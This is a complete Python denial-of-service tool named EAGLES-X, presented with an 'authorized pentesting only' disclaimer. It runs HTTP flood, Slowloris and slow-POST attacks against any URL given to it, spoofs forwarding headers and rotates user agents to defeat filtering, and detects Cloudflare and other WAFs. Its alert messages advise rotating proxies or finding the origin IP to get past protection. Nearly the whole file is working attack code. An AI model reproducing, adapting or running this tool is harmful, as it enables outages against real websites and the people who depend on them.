#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=====================================================================
 EAGLES-X Debug Edition v3.0  -  LIVE EDITION
 Layer 7 load generator + WAF/Cloudflare/Firewall detection
 (authorized pentesting / research ONLY)

 EVERYTHING is printed live to the terminal:
   [->] request sent            [✓] response received
   [✗] timeout/refused/reset    [!!!] site down / IP blacklisted / WAF block

 Usage:
   python3 eagles.py <url>                          # everything auto
   python3 eagles.py <url> --workers 2000 --duration 120
   python3 eagles.py <url> --mode slow --workers 1500
   python3 eagles.py <url> --proxy http://ip:8080 --quiet

 Deps: pip install aiohttp
=====================================================================
"""

import os
import re
import sys
import ssl
import random
import string
import socket
import asyncio
import aiohttp
import argparse
import signal
import threading
import time
import traceback
from collections import deque
from urllib.parse import urlparse

# =====================================================================
# COLORS (live terminal only; stripped from log file)
# =====================================================================
C = {"g": "\033[92m", "r": "\033[91m", "y": "\033[93m",
     "c": "\033[96m", "b": "\033[1m", "d": "\033[2m", "x": "\033[0m"}
USE_COLOR = False
_ANSI = re.compile(r"\x1b\[[0-9;]*m")

def col(code, text):
    return f"{C[code]}{text}{C['x']}" if USE_COLOR else text

# =====================================================================
# FD LIMIT - 100% automatic (v2.2 logic)
# =====================================================================
def ensure_high_fd_limit(target=1048576):
    try:
        import resource
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        new_soft = target if (hard == resource.RLIM_INFINITY or hard >= target) else hard
        if new_soft > soft:
            resource.setrlimit(resource.RLIMIT_NOFILE, (new_soft, hard))
            soft, _ = resource.getrlimit(resource.RLIMIT_NOFILE)
        print(f"[*] fd limits -> soft={soft} hard={hard}")
        return soft
    except Exception as e:
        print(f"[!] setrlimit blocked ({e}) -> auto re-launch...")
    if os.environ.get("EAGLES_REEXEC") != "1":
        import shlex
        os.environ["EAGLES_REEXEC"] = "1"
        script = os.path.abspath(sys.argv[0])
        args = " ".join(shlex.quote(a) for a in sys.argv[1:])
        cmd = f"ulimit -n {target} 2>/dev/null; exec python3 {shlex.quote(script)} {args}"
        print("[*] re-launching self with higher fd limit...")
        try:
            os.execvp("bash", ["bash", "-c", cmd])
        except Exception as e:
            print(f"[!] re-launch failed: {e}")
    try:
        import resource
        soft, _ = resource.getrlimit(resource.RLIMIT_NOFILE)
        return soft
    except Exception:
        return 1024

SOFT_FD = ensure_high_fd_limit()

def auto_cap_workers(workers, soft=SOFT_FD):
    budget = max(int(soft * 0.8), 1)
    if workers > budget:
        print(f"[!] workers {workers} > fd budget {budget} -> auto-capped to {budget}")
        return budget
    return workers

# =====================================================================
# LOGGING (always writes a log file too)
# =====================================================================
DEBUG_ENABLED = True
DBG_MAX_PER_SEC = 40
_dbg_count = 0
_dbg_reset = 0.0
_print_lock = threading.Lock()
LOG_FH = None
LOG_PATH = ""

def set_logfile(path):
    global LOG_FH, LOG_PATH
    LOG_PATH = path
    LOG_FH = open(path, "w", buffering=1)

def _write(line):
    with _print_lock:
        if LOG_FH:
            try:
                LOG_FH.write(_ANSI.sub("", line) + "\n")
            except Exception:
                pass
        print(line, flush=True)

def _dbg_ok():
    global _dbg_count, _dbg_reset
    if not DEBUG_ENABLED:
        return False
    now = time.time()
    with _print_lock:
        if now - _dbg_reset > 1.0:
            _dbg_count = 0
            _dbg_reset = now
        if _dbg_count < DBG_MAX_PER_SEC:
            _dbg_count += 1
            return True
        return False

def dbg(msg, force=False):
    if force or _dbg_ok():
        _write(f"[{time.strftime('%H:%M:%S')}]     {msg}")

def info(msg):
    _write(f"[{time.strftime('%H:%M:%S')}] {col('c', '[+]')} {msg}")

def ok(msg):
    _write(f"[{time.strftime('%H:%M:%S')}] {col('g', '[✓]')} {msg}")

def warn(msg):
    _write(f"[{time.strftime('%H:%M:%S')}] {col('y', '[!]')} {msg}")

def fail(msg):
    _write(f"[{time.strftime('%H:%M:%S')}] {col('r', '[✗]')} {msg}")

def alert(msg):
    _write(f"[{time.strftime('%H:%M:%S')}] {col('r', col('b', '[!!!]'))} {msg}")

def status_bar(msg):
    _write(f"[{time.strftime('%H:%M:%S')}] {col('c', '▸')} {msg}")

# =====================================================================
# WAF / CDN SIGNATURE DATABASE
# =====================================================================
WAF_DB = {
    "Cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "cf-request-id"],
        "server": ["cloudflare"],
        "cookies": ["__cfduid", "__cf_bm", "cf_clearance", "__cfruid"],
        "body": ["attention required! | cloudflare", "cf-error-details",
                 "cloudflare ray id", "just a moment...",
                 "enable javascript and cookies to continue",
                 "cf-chl-", "challenge-platform"]},
    "Akamai Ghost": {
        "headers": ["x-akamai-", "x-powered-by-akamai"],
        "server": ["akamaighost", "akamai"],
        "cookies": [], "body": ["akamai ghost"]},
    "AWS WAF / CloudFront": {
        "headers": ["x-amz-cf-id", "x-amz-cf-pop"],
        "server": ["cloudfront"],
        "cookies": ["aws-alb"], "body": ["request blocked", "requestid"]},
    "F5 BIG-IP ASM": {
        "headers": ["x-wa-info", "x-f5"],
        "server": ["bigip", "f5"],
        "cookies": ["ts"], "body": ["the requested url was rejected",
                                    "security policy violation", "your support id"]},
    "Imperva Incapsula": {
        "headers": ["x-iinfo", "x-cdn"],
        "server": ["incapsula"],
        "cookies": ["incap_ses", "visid_incap"],
        "body": ["incapsula", "contact support for website owners"]},
    "Sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "server": ["sucuri"],
        "cookies": ["sucuri_cloudproxy"],
        "body": ["sucuri web site firewall", "sucuri cloudproxy"]},
    "ModSecurity": {
        "headers": [], "server": ["mod_security", "modsecurity"],
        "cookies": [], "body": ["mod_security", "modsecurity", "not acceptable!"]},
    "Barracuda WAF": {
        "headers": ["x-barracuda"], "server": ["barracuda"],
        "cookies": ["barra_counter_session"],
        "body": ["barracuda", "your request has been blocked"]},
    "Fastly": {
        "headers": ["x-fastly-request-id", "x-served-by"],
        "server": ["fastly"], "cookies": ["fastly"], "body": []},
    "Citrix NetScaler": {
        "headers": ["ns_"], "server": ["netscaler"],
        "cookies": ["nsc_"], "body": ["netscaler"]},
    "Radware": {
        "headers": ["x-rai"], "server": ["radware", "appsec"],
        "cookies": [], "body": ["radware", "appsec"]},
    "Comodo cWatch": {
        "headers": ["x-cwaf"], "server": ["cwatch"],
        "cookies": [], "body": ["comodo cwatch"]},
    "Fortinet FortiWeb": {
        "headers": [], "server": ["fortiweb"],
        "cookies": [], "body": ["fortiweb"]},
    "Wordfence": {
        "headers": [], "server": [],
        "cookies": [], "body": ["blocked by wordfence", "wordfence"]},
    "Qrator": {
        "headers": [], "server": ["qrator"],
        "cookies": [], "body": ["qrator"]},
    "DDoS-Guard": {
        "headers": [], "server": ["ddos-guard", "ddosguard"],
        "cookies": [], "body": ["ddos-guard"]},
    "StackPath": {
        "headers": [], "server": ["stackpath"],
        "cookies": [], "body": ["stackpath"]},
    "Varnish (cache/CDN layer)": {
        "headers": ["x-varnish"], "server": ["varnish"],
        "cookies": [], "body": []},
}

BLOCK_KEYWORDS = [
    "blocked", "access denied", "forbidden", "request rejected", "captcha",
    "security check", "suspicious activity", "rate limit", "too many requests",
    "challenge", "verify you are human", "malicious", "attack detected",
    "anomaly", "your ip has been", "please try again later",
]

seen_wafs = set()
block_alerts = set()
_alerts_fired = set()
server_identified = set()
origin_never_reached = False

# =====================================================================
# REQUEST BUILDER
# =====================================================================
def rnd(n, pool=string.ascii_letters + string.digits):
    return ''.join(random.choice(pool) for _ in range(n))

def fake_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

HOP_HEADERS = ["X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Client-IP"]

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
]

REFERERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://www.facebook.com/",
    "https://twitter.com/", "https://www.youtube.com/", "https://www.reddit.com/",
]

def headers():
    h = {
        "User-Agent": random.choice(UA_LIST),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "fr-FR,fr;q=0.9", "es-ES,es;q=0.9"]),
        "Cache-Control": "no-cache, no-store",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Referer": random.choice(REFERERS) + rnd(random.randint(4, 10)),
    }
    if random.random() < 0.8:
        ip = fake_ip()
        for k in HOP_HEADERS:
            h[k] = ip
    return h

# =====================================================================
# TRIAGE - failure analysis (site down / blacklist / waf)
# =====================================================================
class Triage:
    def __init__(self, size=60):
        self.recent = deque(maxlen=size)
        self.cnt = {"ok": 0, "timeout": 0, "conn": 0, "reset": 0,
                    "ssl": 0, "dns": 0, "http4": 0, "http5": 0, "other": 0}
        self.lat = deque(maxlen=200)
        self.start = time.time()

    def add(self, kind, lat=None):
        self.recent.append(kind)
        self.cnt[kind] = self.cnt.get(kind, 0) + 1
        if lat is not None:
            self.lat.append(lat)

    def window_fail_ratio(self):
        if not self.recent:
            return 0.0
        fails = sum(1 for k in self.recent if k not in ("ok", "http4", "http5"))
        return fails / len(self.recent)

    def http4_ratio(self):
        if not self.recent:
            return 0.0
        c4 = sum(1 for k in self.recent if k == "http4")
        return c4 / len(self.recent)

    def avg_lat(self):
        return sum(self.lat) / len(self.lat) if self.lat else 0.0

    def check_alerts(self, elapsed):
        global origin_never_reached
        if elapsed > 10 and len(self.recent) >= 30:
            fr = self.window_fail_ratio()
            if fr >= 0.98 and "DOWN" not in _alerts_fired:
                _alerts_fired.add("DOWN")
                alert(f"SITE APPEARS DOWN OR IP BLACKLISTED - "
                      f"{int(fr*100)}% of last {len(self.recent)} requests failed")
                warn("  -> if the site was reachable before, your IP is likely blocked")
                warn("  -> try: --proxy http://ip:port  or wait a few minutes")
            h4 = self.http4_ratio()
            if h4 >= 0.6 and "WAF" not in _alerts_fired:
                _alerts_fired.add("WAF")
                alert(f"WAF / RATE-LIMIT BLOCKING - {int(h4*100)}% of last "
                      f"{len(self.recent)} responses are 4xx (403/429 = blocked)")
                warn("  -> Cloudflare/WAF is rejecting your traffic (IP-level)")
                warn("  -> try: rotate proxy / find origin IP")
            r = self.cnt.get("reset", 0)
            c = self.cnt.get("conn", 0)
            if (r + c) >= 30 and (r + c) / max(sum(self.cnt.values()), 1) >= 0.8 \
               and "CONNBLOCK" not in _alerts_fired:
                _alerts_fired.add("CONNBLOCK")
                alert(f"CONNECTION-LEVEL BLOCK - {r} resets + {c} refused "
                      f"(firewall/IDS dropping or rejecting connections)")

T = Triage()

# =====================================================================
# DETECTION CORE
# =====================================================================
def scan_waf(headers_map, body_lower):
    hits = {}
    h = {k.lower(): str(v).lower() for k, v in headers_map.items()}
    server = h.get("server", "")
    setcookie = str(h.get("set-cookie", ""))
    for name, sig in WAF_DB.items():
        ev = []
        for hd in sig["headers"]:
            if hd in h:
                ev.append(f"header:{hd}")
        for sv in sig["server"]:
            if sv in server:
                ev.append(f"server:{server}")
        for ck in sig["cookies"]:
            if ck in setcookie:
                ev.append(f"cookie:{ck}")
        for p in sig["body"]:
            if p in body_lower:
                ev.append(f"body:'{p}'")
        if ev:
            hits[name] = ev
    return hits

def is_block_response(status, body_lower):
    if status in (403, 406, 429):
        return True
    if body_lower and any(k in body_lower for k in BLOCK_KEYWORDS):
        return True
    return False

def cloudflare_report(headers_map, body_lower, status):
    h = {k.lower(): str(v) for k, v in headers_map.items()}
    warn("======== CLOUDFLARE DETECTED ========")
    dbg(f"cf-ray           : {h.get('cf-ray', '?')}", force=True)
    dbg(f"cf-cache-status  : {h.get('cf-cache-status', '?')}", force=True)
    dbg(f"cf-connecting-ip : {h.get('cf-connecting-ip', '?')}", force=True)
    dbg(f"server           : {h.get('server', '?')}", force=True)
    if "just a moment" in body_lower or "cf-chl-" in body_lower or "challenge-platform" in body_lower:
        alert("Cloudflare MANAGED CHALLENGE active (JS challenge / bot protection)")
        warn("  -> direct flood mn IP dyalek ma ghadi ydkhelch -> l9a l origin IP")
    if "attention required" in body_lower or "cf-error-details" in body_lower:
        alert("Cloudflare returned a BLOCK/ERROR page -> request rejected by CF")
    if status == 429:
        alert("429 Too Many Requests -> Cloudflare rate-limiting khddem")
    warn("=====================================")

def analyze_and_report(headers_map, raw_body, status, source):
    body_lower = raw_body[:100_000].decode("utf-8", errors="ignore").lower()
    wafs = scan_waf(headers_map, body_lower)
    for name, ev in wafs.items():
        if name not in seen_wafs:
            seen_wafs.add(name)
            warn(f"[{source}] WAF DETECTED: {name}  [{', '.join(ev)}]")
            if name == "Cloudflare":
                cloudflare_report(headers_map, body_lower, status)
    if is_block_response(status, body_lower):
        key = (status, body_lower[:60])
        if key not in block_alerts:
            block_alerts.add(key)
            alert(f"[{source}] POSSIBLE FIREWALL/BLOCK: status={status} "
                  f"body='{body_lower[:120]}'")
    return wafs

def describe_response(r):
    """returns short live description: via=Cloudflare cache=DYNAMIC(origin) ..."""
    h = {k.lower(): str(v) for k, v in r.headers.items()}
    server = h.get("server", "?")
    if server not in server_identified:
        server_identified.add(server)
        info(f"server identified: {server}")
    parts = [f"via={server}"]
    cache = h.get("cf-cache-status")
    if cache:
        if cache.upper() == "HIT":
            parts.append("cache=HIT(origin NOT touched)")
        else:
            parts.append(f"cache={cache}(origin=YES)")
    else:
        if "x-cache" in h:
            parts.append(f"cache={h['x-cache']}")
    return " ".join(parts)

# =====================================================================
# DNS RESOLVE (show target IPs)
# =====================================================================
def resolve_target(url):
    host = urlparse(url).hostname
    try:
        infos = socket.getaddrinfo(host, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
        ips = sorted({i[4][0] for i in infos})
        info(f"DNS: {host} -> {', '.join(ips[:6])}"
             + (" ..." if len(ips) > 6 else ""))
        return ips
    except Exception as e:
        warn(f"DNS resolution failed for {host}: {e}")
        return []

# =====================================================================
# FINGERPRINT - fast, never hangs (2KB body + 12s hard cap)
# =====================================================================
async def _fingerprint(session, url, proxy):
    info(f"--- Fingerprint: {url} ---")
    t0 = time.time()
    try:
        async with session.get(url, headers=headers(), proxy=proxy,
                               timeout=aiohttp.ClientTimeout(total=12)) as r:
            preview = await r.content.read(2048)          # 2KB ghir - SARI3
            dt = (time.time() - t0) * 1000
            ok(f"fingerprint response: {r.status} in {dt:.0f}ms | {describe_response(r)}")
            dbg("--- response headers ---", force=True)
            for k, v in r.headers.items():
                dbg(f"    {k}: {v}", force=True)
            dbg("--- body preview ---", force=True)
            dbg(f"    {preview.decode('utf-8', errors='ignore')[:200]}", force=True)
            wafs = analyze_and_report(r.headers, preview, r.status, "fingerprint")
            if not wafs:
                info("No known WAF fingerprint in this response.")
        info(f"--- end fingerprint ({(time.time()-t0)*1000:.0f}ms) ---")
        return True
    except asyncio.TimeoutError:
        warn("Fingerprint timed out (12s) - continuing with attack anyway")
        return False
    except Exception as e:
        warn(f"Fingerprint failed: {type(e).__name__}: {e}")
        traceback.print_exc()
        return False

async def fingerprint(session, url, proxy):
    try:
        await asyncio.wait_for(_fingerprint(session, url, proxy), timeout=14)
    except asyncio.TimeoutError:
        warn("Fingerprint hard-capped at 14s - attack starting now")

# =====================================================================
# MODE 1: FLOOD - live per-request reporting
# =====================================================================
async def flood_worker(session, base, proxy, stop, timeout):
    while not stop.is_set():
        sep = "&" if "?" in base else "?"
        url = f"{base}{sep}{rnd(random.randint(4, 9))}={rnd(random.randint(4, 12))}"
        t0 = time.time()
        try:
            async with session.get(url, headers=headers(), proxy=proxy,
                                   timeout=aiohttp.ClientTimeout(total=timeout)) as r:
                dt = (time.time() - t0) * 1000
                st = r.status
                if st < 400:
                    T.add("ok", dt)
                    ok(f"{st} in {dt:.0f}ms | {describe_response(r)} | {url[:60]}")
                else:
                    kind = "http4" if st < 500 else "http5"
                    T.add(kind, dt)
                    fail(f"{st} in {dt:.0f}ms | {describe_response(r)} | {url[:60]}")
                if random.random() < 0.02:
                    raw = await r.content.read(100_000)
                    analyze_and_report(r.headers, raw, st, "flood")
        except asyncio.TimeoutError:
            T.add("timeout")
            fail(f"TIMEOUT after {timeout}s | {url[:60]} (no response - overloaded/down/firewall)")
        except aiohttp.ClientConnectorError as e:
            msg = str(e)
            if "reset by peer" in msg.lower():
                T.add("reset")
                fail(f"CONNECTION RESET by peer | {url[:60]} (firewall/IDS dropping)")
            elif "refused" in msg.lower():
                T.add("conn")
                fail(f"CONNECTION REFUSED | {url[:60]} (site down or firewall rejecting)")
            elif "name or service not known" in msg.lower() or "getaddrinfo" in msg.lower():
                T.add("dns")
                fail(f"DNS FAILED | {url[:60]} (domain removed / DNS down)")
            elif "too many open files" in msg.lower():
                T.add("conn")
                fail(f"FD LIMIT on YOUR machine | {url[:60]}")
            else:
                T.add("conn")
                fail(f"CONN ERROR | {url[:60]} | {type(e).__name__}")
        except (ssl.SSLError, aiohttp.ServerDisconnectedError, aiohttp.ClientOSError) as e:
            T.add("ssl")
            fail(f"TLS/DISCONNECT {type(e).__name__} | {url[:60]} (handshake failed/blocked)")
        except Exception as e:
            T.add("other")
            fail(f"ERROR {type(e).__name__}: {e} | {url[:60]}")
        await asyncio.sleep(random.uniform(0, 0.05))

# =====================================================================
# MODE 2: SLOWLORIS
# =====================================================================
async def slow_worker(host, port, use_ssl, stop, connect_to):
    ctx = ssl.create_default_context() if use_ssl else None
    while not stop.is_set():
        writer = None
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx,
                                        server_hostname=host if use_ssl else None),
                timeout=connect_to)
            path = "/" + rnd(random.randint(5, 20))
            writer.write(f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                         f"User-Agent: {random.choice(UA_LIST)}\r\nAccept: */*\r\n".encode())
            await writer.drain()
            ok(f"slow socket opened {host}:{port} path={path} (holding open)")
            while not stop.is_set():
                await asyncio.sleep(random.uniform(15, 45))
                writer.write(f"X-{rnd(6)}: {rnd(10)}\r\n".encode())
                await writer.drain()
        except asyncio.TimeoutError:
            T.add("timeout")
            fail(f"slow connect timeout {host}:{port} (firewall dropping SYN?)")
            await asyncio.sleep(0.5)
        except (ConnectionRefusedError, ConnectionResetError) as e:
            T.add("reset")
            fail(f"slow {type(e).__name__}: {e} (firewall drop?)")
            await asyncio.sleep(0.5)
        except (ssl.SSLError, OSError) as e:
            T.add("ssl")
            fail(f"slow {type(e).__name__}: {e}")
            await asyncio.sleep(0.5)
        except Exception as e:
            T.add("other")
            fail(f"slow unexpected: {type(e).__name__}: {e}")
            await asyncio.sleep(0.5)
        finally:
            if writer:
                try:
                    writer.close()
                except Exception:
                    pass

# =====================================================================
# MODE 3: SLOWPOST (R-U-Dead-Yet)
# =====================================================================
async def slowpost_worker(host, port, use_ssl, stop, connect_to):
    ctx = ssl.create_default_context() if use_ssl else None
    while not stop.is_set():
        writer = None
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx,
                                        server_hostname=host if use_ssl else None),
                timeout=connect_to)
            size = random.randint(1_000_000, 5_000_000)
            writer.write(f"POST / HTTP/1.1\r\nHost: {host}\r\n"
                         f"Content-Type: application/x-www-form-urlencoded\r\n"
                         f"Content-Length: {size}\r\n\r\n".encode())
            await writer.drain()
            ok(f"slowpost socket opened {host}:{port} claiming {size} bytes")
            for _ in range(random.randint(40, 120)):
                if stop.is_set():
                    break
                writer.write(b"a" * random.randint(1, 10))
                await writer.drain()
                await asyncio.sleep(random.uniform(10, 30))
        except asyncio.TimeoutError:
            T.add("timeout")
            fail(f"slowpost connect timeout {host}:{port}")
            await asyncio.sleep(0.5)
        except (ConnectionRefusedError, ConnectionResetError) as e:
            T.add("reset")
            fail(f"slowpost {type(e).__name__}: {e} (firewall drop?)")
            await asyncio.sleep(0.5)
        except (ssl.SSLError, OSError) as e:
            T.add("ssl")
            fail(f"slowpost {type(e).__name__}: {e}")
            await asyncio.sleep(0.5)
        except Exception as e:
            T.add("other")
            fail(f"slowpost unexpected: {type(e).__name__}: {e}")
            await asyncio.sleep(0.5)
        finally:
            if writer:
                try:
                    writer.close()
                except Exception:
                    pass

# =====================================================================
# STATUS BAR + TRIAGE (every 2s, always visible)
# =====================================================================
async def status_loop(start, stop):
    while not stop.is_set():
        await asyncio.sleep(2)
        el = time.time() - start
        c = T.cnt
        total = sum(c.values())
        reached = c["ok"] + c["http4"] + c["http5"]
        failn = total - reached
        pct = (reached / total * 100) if total else 0.0
        status_bar(f"attempted={total} reached={reached} failed={failn} "
                   f"({pct:.0f}%) | rps={total/el:.0f} | avg={T.avg_lat():.0f}ms "
                   f"| t/o={c['timeout']} conn={c['conn']} rst={c['reset']} "
                   f"4xx={c['http4']} 5xx={c['http5']}")
        T.check_alerts(el)

async def auto_stop(stop, duration):
    info(f"auto-stop scheduled in {duration}s")
    await asyncio.sleep(duration)
    info("auto-stop reached - stopping")
    stop.set()

# =====================================================================
# MAIN
# =====================================================================
async def amain(args):
    global DEBUG_ENABLED, DBG_MAX_PER_SEC, USE_COLOR

    USE_COLOR = sys.stdout.isatty() and not args.no_color

    if not args.log and not args.no_log:
        args.log = f"eagles_{time.strftime('%Y%m%d_%H%M%S')}.log"
    set_logfile(args.log)

    DEBUG_ENABLED = not args.quiet
    if args.debug:
        DBG_MAX_PER_SEC = 10_000_000          # unlimited - EVERYTHING
    elif args.quiet:
        DBG_MAX_PER_SEC = 0
    else:
        DBG_MAX_PER_SEC = 40 if args.workers < 1000 else 15

    args.workers = auto_cap_workers(args.workers)
    conn_budget = 0
    if SOFT_FD < 50000:
        conn_budget = max(int(SOFT_FD * 0.8), 1)

    stop = asyncio.Event()
    loop = asyncio.get_running_loop()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, stop.set)
        except NotImplementedError:
            pass

    # --- FIXED BANNER: raw string => no more SyntaxWarning ---
    BANNER = r"""  ___________              .__                          ____  ___
                 \_   _____/____     ____ |  |   ____   ______         \   \/  /
                  |    __)_\__  \   / ___\|  | _/ __ \ /  ___/  ______  \     /
                  |        \/ __ \_/ /_/  >  |_\  ___/ \___ \  /_____/  /     \
                 /_______  (____  /\___  /|____/\___  >____  >         /___/\  \
                         \/     \//_____/           \/     \/                \_/"""
                         
    info(col("b", BANNER))
    info(f"EAGLES-X v3.0 LIVE | mode={args.mode} | workers={args.workers} "
         f"| timeout={args.timeout}s | proxy={args.proxy or 'direct'} "
         f"| log={args.log}")
    info(f"fd soft={SOFT_FD} | conn_budget={conn_budget or 'unlimited'}")

    resolve_target(args.url)

    if args.mode == "flood":
        conn = aiohttp.TCPConnector(limit=conn_budget, limit_per_host=0,
                                    ttl_dns_cache=60, enable_cleanup_closed=True)
        session = aiohttp.ClientSession(connector=conn, trust_env=True)
        await fingerprint(session, args.url, args.proxy)
        tasks = [asyncio.create_task(flood_worker(session, args.url, args.proxy,
                                                  stop, args.timeout))
                 for _ in range(args.workers)]
        tasks.append(asyncio.create_task(status_loop(time.time(), stop)))
        if args.duration:
            tasks.append(asyncio.create_task(auto_stop(stop, args.duration)))
        info(f"ATTACK STARTED - {args.workers} workers flooding | "
             f"Ctrl+C or --duration to stop")
        await stop.wait()
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        await session.close()
        totals = T.cnt
    else:
        u = urlparse(args.url)
        host, port = u.hostname, u.port or (443 if u.scheme == "https" else 80)
        use_ssl = u.scheme == "https"
        tmp = aiohttp.ClientSession()
        await fingerprint(tmp, args.url, args.proxy)
        await tmp.close()
        fn = slow_worker if args.mode == "slow" else slowpost_worker
        tasks = [asyncio.create_task(fn(host, port, use_ssl, stop, args.timeout))
                 for _ in range(args.workers)]
        tasks.append(asyncio.create_task(status_loop(time.time(), stop)))
        if args.duration:
            tasks.append(asyncio.create_task(auto_stop(stop, args.duration)))
        info(f"{args.mode.upper()} STARTED - {args.workers} sockets holding | "
             f"Ctrl+C or --duration to stop")
        await stop.wait()
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        totals = T.cnt

    # ====================== FINAL REPORT ======================
    alert("\n----- FINAL REPORT -----")
    if seen_wafs:
        warn("WAF(s) detected: " + ", ".join(sorted(seen_wafs)))
    else:
        info("No known WAF fingerprint detected.")
    if block_alerts:
        warn("Block/firewall events observed:")
        for (st, body) in list(block_alerts)[:10]:
            warn(f"   status={st} | body='{body[:100]}'")
    else:
        info("No block/firewall events observed.")
    if totals:
        info(f"totals -> ok={totals['ok']} timeout={totals['timeout']} "
             f"conn={totals['conn']} reset={totals['reset']} ssl={totals['ssl']} "
             f"dns={totals['dns']} 4xx={totals['http4']} 5xx={totals['http5']}")
    if totals.get("ok", 0) == 0 and sum(totals.values()) > 0:
        alert("CONCLUSION: ZERO successful responses - requests did NOT reach "
              "the site (site down / IP blocked / WAF challenge)")
    elif totals.get("ok", 0) > 0:
        ok(f"CONCLUSION: {totals['ok']} responses received - site is UP and "
           "responding (attack running)")
    info(f"full report saved in: {LOG_PATH}")
    info("done.")
    if LOG_FH:
        LOG_FH.close()

# =====================================================================
# CLI
# =====================================================================
if __name__ == "__main__":
    p = argparse.ArgumentParser(
        description="EAGLES-X v3.0 LIVE (authorized testing only)")
    p.add_argument("url", help="target URL, ex: https://example.com/")
    p.add_argument("--mode", choices=["flood", "slow", "slowpost"], default="flood")
    p.add_argument("--workers", type=int, default=1000)
    p.add_argument("--proxy", default=None)
    p.add_argument("--timeout", type=float, default=4.0)
    p.add_argument("--duration", type=int, default=None,
                   help="auto-stop after N seconds")
    p.add_argument("--log", default=None, help="custom log path (auto by default)")
    p.add_argument("--no-log", action="store_true", help="disable log file")
    p.add_argument("--debug", action="store_true",
                   help="print EVERY request (no throttle)")
    p.add_argument("--quiet", action="store_true",
                   help="only status bar + alerts")
    p.add_argument("--no-color", action="store_true", help="disable colors")
    a = p.parse_args()
    try:
        asyncio.run(amain(a))
    except KeyboardInterrupt:
        print("\n[!] interrupted by user")
